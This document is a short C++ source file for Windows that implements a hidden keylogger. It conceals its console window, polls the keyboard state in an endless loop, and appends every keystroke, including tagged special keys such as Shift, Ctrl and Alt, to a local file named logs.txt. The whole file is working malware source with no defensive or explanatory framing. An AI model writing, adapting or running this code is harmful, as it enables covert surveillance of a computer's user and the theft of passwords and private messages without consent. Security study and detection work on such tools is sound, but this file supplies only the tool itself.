#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <iostream>
#include <fstream>
#include <algorithm>

//log file path
#define LOG_FILE "logs.txt"

//save data into log file
void saveData(const std::string& data) {
    std::ofstream logFile(LOG_FILE, std::ios::app); // Create file directly using ofstream instead of fstream

    if (logFile.is_open()) { // If the file is successfully opened
        logFile << data;
        logFile.close(); // Close the file
    }
}

std::string translateSpecialKey(int key) {
    std::string result;

    switch (key) {
    case VK_SPACE:
        result = " ";
        break;
    case VK_RETURN:
        result = "\n";
        break;
    case VK_BACK:
        result = "\b";
        break;
    case VK_CAPITAL:
        result = "[CAPS_LOCK]";
        break;
    case VK_SHIFT:
        result = "[SHIFT]";
        break;
    case VK_TAB:
        result = "[TAB]";
        break;
    case VK_CONTROL:
        result = "[CTRL]";
        break;
    case VK_MENU:
        result = "[ALT]";
        break;
    default:
        break;
    }

    return result;
}

int main() {
    int specialKeyArray[] = { VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_CAPITAL, VK_TAB, VK_CONTROL, VK_MENU };
    bool isSpecialKey;

    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray), key) != std::end(specialKeyArray);
                if (isSpecialKey) {
                    std::string specialKeyChar = translateSpecialKey(key);
                    saveData(specialKeyChar);
                } else {
                    char character = static_cast<char>(key);
                    if (GetKeyState(VK_CAPITAL) & 0x0001) { // Check with the & operator
                        saveData(std::string(1, character));
                    } else {
                        saveData(std::string(1, std::tolower(character)));
                    }
                }
            }
        }
    }

    return 0;
}